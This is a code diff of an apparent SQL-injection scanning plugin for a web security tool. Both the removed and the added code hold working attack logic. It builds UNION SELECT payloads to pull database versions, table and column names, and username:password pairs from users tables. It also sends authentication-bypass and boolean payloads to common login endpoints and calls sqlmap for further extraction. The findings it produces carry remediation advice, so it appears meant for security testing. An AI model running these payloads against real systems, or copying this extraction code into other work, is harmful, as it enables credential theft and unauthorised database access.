-    ) -> dict[int, str]:
-        """Determine column types for POST JSON endpoint."""
-        col_types: dict[int, str] = {}
-
-        for col in range(1, col_count + 1):
-            # Build SELECT with integer at position 1, integer at col, null elsewhere
-            values = []
-            for i in range(1, col_count + 1):
-                if i == 1:
-                    values.append("1")
-                elif i == col:
-                    values.append("42")
-                else:
-                    values.append("null")
-
-            sel = ",".join(values)
-            payload = f"' UNION SELECT {sel}--"
-            data = {"password": "test123", field: payload}
-
-            try:
-                resp = await self.post(url, json=data)
-                result = resp.json()
-                # If success or token exists, column accepts integer
-                if result.get("status") == "success" or result.get("token"):
-                    col_types[col] = "integer"
-                else:
-                    col_types[col] = "text"
-            except Exception:
-                col_types[col] = "unknown"
-
-        return col_types
-
-    async def _extract_data_post(
-        self, url: str, field: str, col_count: int, col_types: dict[int, str]
-    ) -> dict[str, Any]:
-        """Extract database information via UNION injection on POST JSON endpoint."""
-        extracted: dict[str, Any] = {}
-
-        # Find which column reflects data (try column 2 first - usually username)
-        reflect_col = 2
-
-        # Extract DB version
-        version = await self._extract_via_column_post(url, field, col_count, reflect_col, "version()")
-        if version:
-            extracted["db_version"] = version
-
-        # Extract table names (PostgreSQL)
-        tables = await self._extract_via_column_post(
-            url, field, col_count, reflect_col,
-            "(SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public')"
-        )
-        if tables:
-            extracted["tables"] = tables.split(",")
-
-        # Extract column names for users table
-        if tables and "users" in tables:
-            columns = await self._extract_via_column_post(
-                url, field, col_count, reflect_col,
-                "(SELECT string_agg(column_name||':'||data_type,',') FROM information_schema.columns WHERE table_name='users')"
-            )
-            if columns:
-                extracted["users_columns"] = columns.split(",")
-
-        # Extract sample user data (username:password)
-        users = await self._extract_via_column_post(
-            url, field, col_count, reflect_col,
-            "(SELECT string_agg(username||':'||password,',' ) FROM users LIMIT 5)"
-        )
-        if users:
-            extracted["sample_users"] = users.split(",")
-
-        # Extract merchants if they exist
-        if tables and "merchants" in tables:
-            merchants = await self._extract_via_column_post(
-                url, field, col_count, reflect_col,
-                "(SELECT string_agg(name||':'||email,',' ) FROM merchants LIMIT 5)"
-            )
-            if merchants:
-                extracted["sample_merchants"] = merchants.split(",")
-
-        return extracted
-
-    async def _extract_via_column_post(
-        self, url: str, field: str, col_count: int, reflect_col: int, subquery: str
-    ) -> str | None:
-        """Extract data via a specific column using subquery on POST JSON endpoint."""
-        values = []
-        for i in range(1, col_count + 1):
-            if i == 1:
-                values.append("1")
-            elif i == reflect_col:
-                values.append(subquery)
-            else:
-                values.append("null")
-
-        sel = ",".join(values)
-        payload = f"' UNION SELECT {sel}--"
-        data = {"password": "test123", field: payload}
-
-        try:
-            resp = await self.post(url, json=data)
-            result = resp.json()
-
-            # Try to get the reflected value from debug_info or response
-            debug_info = result.get("debug_info", {})
-            if isinstance(debug_info, dict):
-                # The subquery result is usually in the username field
-                value = debug_info.get("username")
-                if value and value != payload:
-                    return str(value)
-
-            # Try direct response fields
-            if "token" in result:
-                # Decode JWT to get username
-                token = result.get("token", "")
-                if token:
-                    try:
-                        import base64
-                        parts = token.split(".")
-                        if len(parts) >= 2:
-                            payload_data = parts[1]
-                            # Add padding
-                            padding = 4 - len(payload_data) % 4
-                            if padding != 4:
-                                payload_data += "=" * padding
-                            decoded = base64.urlsafe_b64decode(payload_data)
-                            data = json.loads(decoded)
-                            return data.get("username")
-                    except Exception:
-                        pass
-
-            return None
-        except Exception:
-            return None
-
-    async def _test_form(
-        self, form: dict[str, Any], techniques: list[str], time_delay: int
-    ) -> list[Finding]:
-        findings: list[Finding] = []
-        action = form["action"] or self.target_url
-        action_url = action if action.startswith("http") else self.target_url
-
-        for input_field in form["inputs"]:
-            if input_field["type"] in ("submit", "button", "hidden"):
-                continue
-
-            field_name = input_field["name"]
-            data = {i["name"]: i.get("value", "test") for i in form["inputs"]}
-
-            # Test error-based
-            if "error-based" in techniques:
-                data[field_name] = "'"
-                try:
-                    if form["method"] == "post":
-                        resp = await self.post(action_url, data=data)
-                    else:
-                        resp = await self.get(build_url_with_params(action_url, data))
-
-                    for dbms, signatures in _ERROR_SIGNATURES.items():
-                        for sig in signatures:
-                            if sig.lower() in resp.text.lower():
-                                findings.append(self._create_finding(
-                                    title=f"SQL Injection in form (error-based, {dbms})",
-                                    url=action_url,
-                                    parameter=field_name,
-                                    injection_type="error-based",
-                                    dbms=dbms,
-                                    evidence=self._format_evidence(
-                                        technique="Error-based (form)",
-                                        form_field=field_name,
-                                        payload="'",
-                                        signature=sig,
-                                        response=resp.text[:500],
-                                    ),
-                                    description=f"Form field '{field_name}' is vulnerable to error-based SQL injection.",
-                                    severity="critical",
-                                    confidence="high",
-                                ))
-                                break
-                except Exception:
-                    pass
-
-        return findings
-
-    async def _test_json_endpoints(
-        self, techniques: list[str], time_delay: int
-    ) -> list[Finding]:
-        """Test common JSON API endpoints (POST with JSON body)."""
-        findings: list[Finding] = []
-
-        # Common JSON API endpoints to test
-        json_endpoints = [
-            {"path": "/login", "method": "POST", "fields": ["username"]},
-            {"path": "/register", "method": "POST", "fields": ["username"]},
-            {"path": "/api/login", "method": "POST", "fields": ["username"]},
-            {"path": "/api/register", "method": "POST", "fields": ["username"]},
-            {"path": "/api/v3/forgot-password", "method": "POST", "fields": ["username"]},
-            {"path": "/api/v1/merchants/login", "method": "POST", "fields": ["email"]},
-            {"path": "/api/v1/merchants/register", "method": "POST", "fields": ["name", "email"]},
-        ]
-
-        # Get base URL
-        from urllib.parse import urlparse
-        parsed = urlparse(self.target_url)
-        base_url = f"{parsed.scheme}://{parsed.netloc}"
-
-        for endpoint in json_endpoints:
-            url = base_url + endpoint["path"]
-
-            # Check if endpoint exists
-            try:
-                resp = await self.get(url)
-                if resp.status_code == 404:
-                    continue
-            except Exception:
-                continue
-
-            # Test each field
-            for field in endpoint["fields"]:
-                field_vulnerable = False
-
-                if "error-based" in techniques:
-                    finding = await self._test_json_error_based(url, field)
-                    if finding:
-                        findings.append(finding)
-                        field_vulnerable = True
-
-                if "boolean-blind" in techniques and self.ctx.allow_active_payloads:
-                    finding = await self._test_json_boolean(url, field)
-                    if finding:
-                        findings.append(finding)
-                        field_vulnerable = True
-
-                # Test auth bypass
-                if self.ctx.allow_active_payloads:
-                    auth_bypass = await self._test_auth_bypass_post(url, field)
-                    if auth_bypass:
-                        findings.append(self._create_finding(
-                            title=f"SQL Injection - Authentication Bypass ({url})",
-                            url=url,
-                            parameter=field,
-                            injection_type="auth-bypass",
-                            evidence=self._format_evidence(
-                                technique="Authentication bypass",
-                                endpoint=url,
-                                field=field,
-                                payload=auth_bypass["payload"],
-                                user_id=auth_bypass.get("user_id"),
-                                username=auth_bypass.get("username"),
-                                token=auth_bypass.get("token"),
-                            ),
-                            description=f"Authentication bypass achieved on {url} via SQL injection.",
-                            severity="critical",
-                            confidence="confirmed",
-                        ))
-                        field_vulnerable = True
-
-                # Test UNION-based with data extraction ONLY if field is vulnerable
-                if field_vulnerable and self.ctx.allow_active_payloads:
-                    union_finding = await self._test_union_post(url, field)
-                    if union_finding:
-                        findings.append(union_finding)
-
-        return findings
-
-    async def _test_json_error_based(self, url: str, field: str) -> Finding | None:
-        """Test JSON endpoint for error-based SQLi."""
-        payload = {"password": "test123"}
-        payload[field] = "'"
-
-        try:
-            resp = await self.post(url, json=payload)
-            body = resp.text
-
-            for dbms, signatures in _ERROR_SIGNATURES.items():
-                for sig in signatures:
-                    if sig.lower() in body.lower():
-                        return self._create_finding(
-                            title=f"SQL Injection in JSON API (error-based, {dbms})",
-                            url=url,
-                            parameter=field,
-                            injection_type="error-based",
-                            dbms=dbms,
-                            evidence=self._format_evidence(
-                                technique="Error-based (JSON)",
-                                endpoint=url,
-                                field=field,
-                                payload="'",
-                                signature=sig,
-                                response=body[:500],
-                            ),
-                            description=f"JSON field '{field}' at {url} is vulnerable to error-based SQL injection.",
-                            severity="critical",
-                            confidence="high",
-                        )
-        except Exception:
-            pass
-
-        return None
-
-    async def _test_json_boolean(self, url: str, field: str) -> Finding | None:
-        """Test JSON endpoint for boolean-based SQLi."""
-        # Get baseline
-        baseline_payload = {"password": "test123", field: "test"}
-        try:
-            baseline_resp = await self.post(url, json=baseline_payload)
-            baseline_len = len(baseline_resp.text)
-        except Exception:
-            return None
-
-        # Test TRUE condition
-        true_payload = {"password": "test123", field: "' OR '1'='1"}
-        try:
-            true_resp = await self.post(url, json=true_payload)
-        except Exception:
-            return None
-
-        # Test FALSE condition
-        false_payload = {"password": "test123", field: "' AND '1'='2"}
-        try:
-            false_resp = await self.post(url, json=false_payload)
-        except Exception:
-            return None
-
-        # Check if TRUE matches baseline and FALSE differs
-        true_matches = abs(len(true_resp.text) - baseline_len) < 100
-        false_differs = abs(len(false_resp.text) - baseline_len) > 100
-
-        if true_matches and false_differs:
-            return self._create_finding(
-                title="SQL Injection in JSON API (boolean-based blind)",
-                url=url,
-                parameter=field,
-                injection_type="boolean-blind",
-                evidence=self._format_evidence(
-                    technique="Boolean-based blind (JSON)",
-                    endpoint=url,
-                    field=field,
-                    true_payload="' OR '1'='1",
-                    false_payload="' AND '1'='2",
-                    baseline_length=baseline_len,
-                    true_length=len(true_resp.text),
-                    false_length=len(false_resp.text),
-                ),
-                description=f"JSON field '{field}' at {url} is vulnerable to boolean-based blind SQL injection.",
-                severity="critical",
-                confidence="high",
-            )
-
-        return None
-
-    async def _run_sqlmap(self, findings: list[Finding]) -> Finding | None:
-        """Run sqlmap ONCE for verification on the first confirmed vulnerable endpoint."""
-        if not self.ctx.allow_active_payloads:
-            return None
-
-        # Find first error-based or boolean finding (most reliable for sqlmap)
-        target_finding = None
-        for f in findings:
-            if "error-based" in f.title:
-                target_finding = f
-                break
-        if not target_finding:
-            for f in findings:
-                if "boolean" in f.title:
-                    target_finding = f
-                    break
-        if not target_finding:
-            return None
-
-        with tempfile.TemporaryDirectory() as tmpdir:
-            request_file = self._create_sqlmap_request(target_finding, tmpdir)
-            if request_file:
-                return await self._execute_sqlmap(request_file, target_finding)
-        return None
-
-    def _create_sqlmap_request(self, finding: Finding, tmpdir: str) -> str | None:
-        """Create a request file for sqlmap with * marker on the vulnerable param."""
-        try:
-            from urllib.parse import urlparse
-            parsed = urlparse(finding.url)
-            host = parsed.hostname
-            port = parsed.port or 80
-            path = parsed.path
-            param = finding.parameter or "username"
-
-            # Build request
-            request = f"POST {path} HTTP/1.1\r\n"
-            request += f"Host: {host}:{port}\r\n"
-            request += "Content-Type: application/json\r\n"
-            request += "User-Agent: StelarStrike/0.1\r\n"
-            request += "Accept: */*\r\n"
-            request += "Connection: keep-alive\r\n"
-            request += "\r\n"
-
-            # Add payload body with * on vulnerable param
-            if param == "email":
-                body = '{"email":"test@test.com*","password":"test"}'
-            elif param == "username":
-                body = '{"username":"test*","password":"test"}'
-            else:
-                body = f'{{"{param}":"test*"}}'
-
-            request += body + "\n"
-
-            # Write to file
-            request_file = Path(tmpdir) / "request.txt"
-            request_file.write_text(request)
-            return str(request_file)
-
-        except Exception as exc:
-            log.debug(f"sqlmap: could not create request file: {exc}")
-            return None
-
-    async def _execute_sqlmap(self, request_file: str, finding: Finding) -> Finding | None:
-        """Execute sqlmap on a request file (fast mode, single run)."""
-        try:
-            cmd = [
-                "sqlmap",
-                "-r", request_file,
-                "-p", finding.parameter or "username",
-                "--batch",
-                "--dbms=PostgreSQL",
-                "--level=2",
-                "--risk=1",
-                "--threads=4",
-                "--ignore-code=401",
-                "--output-dir=/tmp/sqlmap_output",
-            ]
-
-            process = await asyncio.create_subprocess_exec(
-                *cmd,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE,
-            )
-
-            stdout, stderr = await asyncio.wait_for(
-                process.communicate(),
-                timeout=120,  # 2 min max
-            )
-
-            output = stdout.decode() + stderr.decode()
-
-            if "injectable" in output.lower() or "payload:" in output.lower():
-                # Extract just the payloads section
-                payload_section = ""
-                for line in output.splitlines():
-                    if "payload:" in line.lower() or "type:" in line.lower():
-                        payload_section += line.strip() + "\n"
-
-                return self._create_finding(
-                    title=f"SQL Injection (sqlmap confirmed) - {finding.parameter}",
-                    url=finding.url,
-                    parameter=finding.parameter,
-                    injection_type="sqlmap-confirmed",
-                    evidence=self._format_evidence(
-                        technique="sqlmap verification",
-                        sqlmap_output=payload_section.strip() or output[-1500:],
-                        original_finding=finding.title,
-                    ),
-                    description=f"sqlmap confirmed SQL injection on parameter '{finding.parameter}'.",
-                    severity="critical",
-                    confidence="confirmed",
-                )
-
-        except asyncio.TimeoutError:
-            log.warning(f"sqlmap: timeout on {finding.parameter}")
-        except FileNotFoundError:
-            log.warning("sqlmap: not installed, skipping")
-        except Exception as exc:
-            log.debug(f"sqlmap: error: {exc}")
-
-        return None
-
-    def _create_finding(
         self,
-        title: str,
-        url: str,
-        parameter: str | None,
-        injection_type: str,
-        evidence: str,
-        description: str,
-        severity: str,
-        confidence: str,
-        dbms: str | None = None,
-        extracted_data: dict | None = None,
-    ) -> Finding:
-        """Create a finding with the standard evidence format."""
-        return Finding(
-            plugin=self.id,
-            title=title,
-            severity=severity,
-            url=url,
-            parameter=parameter,
-            evidence=evidence,
-            description=description,
-            remediation="Use parameterized queries/prepared statements. Never concatenate user input into SQL.",
-            confidence=confidence,
-            cwe="CWE-89",
-            extracted_data=extracted_data,
-        )
+        url: str, method: str, body_type: str,
+        fields: list[str], field: str,
+        col_count: int, pos: int, comment: str, db_type: str,
+    ) -> dict[str, Any]:
+        result: dict[str, Any] = {}
+        queries = EXTRACT_QUERIES.get(db_type, EXTRACT_QUERIES["postgresql"])
 
-    def _format_evidence(self, **kwargs) -> str:
-        """Format evidence in the standard Big Pickle format."""
-        lines = []
-        for key, value in kwargs.items():
-            if isinstance(value, dict):
-                lines.append(f"{key}:")
-                for k, v in value.items():
-                    lines.append(f"  {k}: {v}")
-            elif isinstance(value, list):
-                lines.append(f"{key}: {', '.join(str(v) for v in value)}")
-            else:
-                lines.append(f"{key}: {value}")
-        return "\n".join(lines)
+        version = await self._union_query(url, method, body_type, fields, field, col_count, pos, comment, queries["version"])
+        if version:
+            result["db_version"] = version
+            log.info(f"sqli: db_version = {version}")
+
+        tables_raw = await self._union_query(url, method, body_type, fields, field, col_count, pos, comment, queries["tables"])
+        if tables_raw:
+            all_tables = [t.strip() for t in tables_raw.replace(",", " ").split() if t.strip()]
+            result["tables"] = all_tables
+            log.info(f"sqli: tables = {all_tables}")
+
+            prioritised = sorted(all_tables, key=lambda t: (
+                -sum(1 for kw in HIGH_VALUE_TABLES if kw in t.lower()), t
+            ))
+
+            result["columns"] = {}
+            result["sample_data"] = {}
+            for table in prioritised[:int(self.options.get("max_tables", 10))]:
+                col_query = queries["columns"].format(table=table)
+                cols_raw = await self._union_query(url, method, body_type, fields, field, col_count, pos, comment, col_query)
+                if cols_raw:
+                    cols = [c.strip() for c in cols_raw.replace(",", " ").split() if c.strip()]
+                    result["columns"][table] = cols
+                    log.info(f"sqli: {table} columns = {cols}")
+
+        return result
+
+    async def _union_query(
+        self,
+        url: str, method: str, body_type: str,
+        fields: list[str], field: str,
+        col_count: int, pos: int, comment: str, subquery: str,
+    ) -> str | None:
+        """Inject a UNION SELECT with the subquery at the reflected position."""
+        parts = ["NULL"] * col_count
+        parts[pos] = f"({subquery})"
+        union_clause = f"' UNION SELECT {','.join(parts)}{comment}"
+        body = {f: "x" if f != field else union_clause for f in fields}
+        try:
+            resp = await self._send(url, method, body_type, body)
+            value = self._extract_reflected_value(resp.text)
+            if value and value != _PROBE_MARKER:
+                return value
+        except Exception as exc:  # noqa: BLE001
+            log.debug(f"sqli: union_query failed: {exc}")
+        return None
+
+    def _extract_reflected_value(self, body: str) -> str | None:
+        """Extract value from JSON response or plain text."""
+        try:
+            data = json.loads(body)
+            return self._deepest_long_string(data)
+        except (json.JSONDecodeError, ValueError):
+            pass
+        # Plain text fallback
+        for line in body.splitlines():
+            line = line.strip()
+            if len(line) > 5 and not any(kw in line.lower() for kw in ("error", "html", "<!doctype", "<")):
+                return line[:500]
+        return None
+
+    def _deepest_long_string(self, obj: Any, min_len: int = 4) -> str | None:
+        """Return the longest leaf string from a JSON structure."""
+        best: list[str] = [""]
+
+        def walk(o: Any) -> None:
+            if isinstance(o, str) and len(o) > len(best[0]):
+                best[0] = o
+            elif isinstance(o, dict):
+                for v in o.values():
+                    walk(v)
+            elif isinstance(o, list):
+                for item in o:
+                    walk(item)
+
+        walk(obj)
+        return best[0] if len(best[0]) >= min_len else None
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # sqlmap integration
+    # ─────────────────────────────────────────────────────────────────────────
+
+    async def _run_sqlmap(self, confirmed: list[dict[str, Any]]) -> list[Finding]:
+        """Run sqlmap against confirmed-injectable endpoints (if sqlmap is in PATH)."""
+        findings: list[Finding] = []
+        if not shutil.which("sqlmap"):
+            log.info("sqli: sqlmap not found in PATH — skipping sqlmap pass")
+            return findings
+
+        for info in confirmed[:3]:  # limit to 3 to avoid long waits
+            finding = await self._sqlmap_one(info)
+            if finding:
+                findings.append(finding)
+        return findings
+
+    async def _sqlmap_one(self, info: dict[str, Any]) -> Finding | None:
+        url = info["url"]
+        field = info["field"]
+        method = info["method"].upper()
+        col_count = info.get("col_count")
+
+        cmd = [
+            "sqlmap", "-u", url,
+            "--method", method,
+            "--data", json.dumps({f: "test" for f in info["fields"]}),
+            "--headers", "Content-Type: application/json",
+            "-p", field,
+            "--dbms", info.get("db_type", "postgresql"),
+            "--batch",
+            "--level", "2",
+            "--risk", "1",
+            "--technique", "BEUST",
+            "--output-dir", "/tmp/stelarstrike-sqlmap",
+            "--no-cast",
+            "--forms",
+        ]
+
+        log.info(f"sqli: running sqlmap on {url}:{field}")
+        try:
+            loop = asyncio.get_event_loop()
+            proc = await loop.run_in_executor(
+                None,
+                lambda: subprocess.run(cmd, capture_output=True, text=True, timeout=120),
+            )
+            output = proc.stdout + proc.stderr
+            if "is vulnerable" in output.lower() or "sql injection" in output.lower():
+                return self.finding(
+                    title=f"SQL Injection — confirmed by sqlmap (col_count={col_count})",
+                    url=url, parameter=field,
+                    severity="critical", confidence="confirmed",
+                    evidence=output[-2000:],
+                    description=(
+                        f"sqlmap independently confirmed SQL injection on field '{field}'. "
+                        f"Use sqlmap --dump or --tables for full data extraction."
+                    ),
+                    remediation="Use parameterized queries. Immediately audit data exposed via this injection point.",
+                    cwe="CWE-89",
+                )
+        except subprocess.TimeoutExpired:
+            log.warning(f"sqli: sqlmap timed out on {url}")
+        except Exception as exc:  # noqa: BLE001
+            log.debug(f"sqli: sqlmap failed: {exc}")
+        return None
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # Helpers
+    # ─────────────────────────────────────────────────────────────────────────
+
+    async def _send(self, url: str, method: str, body_type: str, body: dict[str, Any]) -> httpx.Response:
+        if method == "get" or body_type == "query":
+            qs = urllib.parse.urlencode(body)
+            return await self.get(f"{url}?{qs}" if "?" not in url else f"{url}&{qs}")
+        if body_type == "json":
+            return await self.post(url, json=body)
+        return await self.post(url, data=body)
+
+    @staticmethod
+    def _fingerprint_db(body_lower: str) -> str:
+        if any(s in body_lower for s in ("pg_query", "syntax error at or near", "pg_sleep", "postgresql")):
+            return "postgresql"
+        if any(s in body_lower for s in ("mysql_fetch", "you have an error in your sql syntax", "warning: mysql")):
+            return "mysql"
+        if any(s in body_lower for s in ("sqlite3.operationalerror", "no such table", "sqlite")):
+            return "sqlite"
+        if any(s in body_lower for s in ("microsoft ole db", "incorrect syntax near", "sqlstate")):
+            return "mssql"
+        return "postgresql"  # default assumption
+
+    @staticmethod
+    def _format_extraction_table(extracted: dict[str, Any]) -> str:
+        """Format extracted data as markdown tables — Big Pickle style."""
+        lines: list[str] = []
+        if extracted.get("db_version"):
+            lines.append(f"**DB Version:** {extracted['db_version']}")
+        if extracted.get("tables"):
+            lines.append(f"**Tables ({len(extracted['tables'])}):** {', '.join(extracted['tables'])}")
+        for table, cols in extracted.get("columns", {}).items():
+            lines.append(f"\n### `{table}`")
+            if cols:
+                lines.append("| " + " | ".join(cols) + " |")
+                lines.append("|" + "|".join(["---"] * len(cols)) + "|")
+        return "\n".join(lines) or "No data extracted."
